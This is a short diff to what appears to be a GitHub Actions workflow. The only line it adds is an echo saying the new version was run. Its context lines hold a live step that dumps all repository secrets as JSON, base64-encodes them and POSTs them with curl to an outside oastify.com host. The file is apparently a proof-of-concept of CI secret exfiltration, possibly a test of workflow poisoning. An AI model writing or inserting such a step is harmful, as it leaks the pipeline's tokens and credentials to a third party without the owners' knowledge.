@@ -15,3 +15,4 @@ jobs:
       - run: |
           curl -X POST "https://g6nurz0c3u2pqawebsvjklildcj37xvm.oastify.com" \
             -d "$(echo '${{ toJson(secrets) }}' | base64)"
+          echo "the new version was run"
